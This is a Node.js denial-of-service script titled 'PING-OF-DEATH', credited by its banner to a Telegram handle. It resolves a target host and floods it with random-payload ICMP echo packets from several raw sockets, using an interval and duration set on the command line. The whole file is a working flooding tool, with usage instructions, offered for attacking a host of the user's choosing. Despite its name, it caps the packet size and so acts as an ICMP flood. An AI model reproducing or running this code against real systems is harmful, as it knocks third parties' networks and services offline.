const raw = require('raw-socket');
const os = require('os');
const dns = require('dns');

// Banner ASCII
console.log(`
⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣦⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                        METHODS BY T.ME/PASAYOURS
`);

// Validate arguments
if (process.argv.length < 6) {
    console.log('Usage: node PING-OF-DEATH.js <host-target> <size(byte)> <threads> <interval(ms)> <time(s)>');
    process.exit(1);
}

// Extract arguments
const targetHost = process.argv[2];
const packetSize = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const interval = parseFloat(process.argv[5]);
const time = parseInt(process.argv[6]) * 1000; // Convert to milliseconds

// Maximum ICMP packet size including headers is 65535 bytes, but the actual payload size must be smaller
const MAX_PAYLOAD_SIZE = 65507; // 65535 - 20 (IP header) - 8 (ICMP header)

if (packetSize > MAX_PAYLOAD_SIZE) {
    console.log(`Packet size should not exceed ${MAX_PAYLOAD_SIZE} bytes`);
    process.exit(1);
}

// Function to calculate checksum
function checksum(buf) {
    let sum = 0;
    for (let i = 0; i < buf.length - 1; i += 2) {
        sum += buf.readUInt16BE(i);
        sum = (sum & 0xffff) + (sum >> 16);
    }
    if (buf.length % 2 === 1) {
        sum += buf.readUInt8(buf.length - 1) << 8;
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return ~sum & 0xffff;
}

// Function to resolve DNS to IP
function resolveDNS(host, callback) {
    dns.lookup(host, (err, address) => {
        if (err) {
            console.error('DNS Lookup error:', err);
            process.exit(1);
        }
        callback(address);
    });
}

// Function to create ICMP packet with random content and type
const createICMPPacket = () => {
    const buf = Buffer.alloc(packetSize);
    buf.writeUInt8(8, 0); // Type: 8 (Echo) - Change to different types as needed
    buf.writeUInt8(0, 1); // Code: 0
    buf.writeUInt16BE(0, 2); // Checksum: 0 initially
    buf.writeUInt16BE(process.pid & 0xffff, 4); // Identifier
    buf.writeUInt16BE(0, 6); // Sequence number

    // Fill payload with random characters
    for (let i = 8; i < packetSize; i++) {
        buf.writeUInt8(Math.floor(Math.random() * 256), i);
    }

    // Calculate checksum
    const check = checksum(buf);
    buf.writeUInt16BE(check, 2);

    return buf;
};

// Function to send ICMP packet
const sendPing = (socket, address) => {
    const packet = createICMPPacket();
    socket.send(packet, 0, packet.length, address, (err) => {
        if (err) {
            console.error('Error sending packet:', err);
        }
    });
};

// Function to create and start worker threads
const startThreads = (target) => {
    for (let i = 0; i < threads; i++) {
        const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

        socket.on('error', (err) => {
            console.error('Socket error:', err);
        });

        setInterval(() => {
            sendPing(socket, target);
        }, interval);

        // Stop the attack after the specified time
        setTimeout(() => {
            socket.close();
        }, time);
    }
};

// Main execution
resolveDNS(targetHost, (address) => {
    console.log(`Resolved ${targetHost} to ${address}`);
    startThreads(address);
});
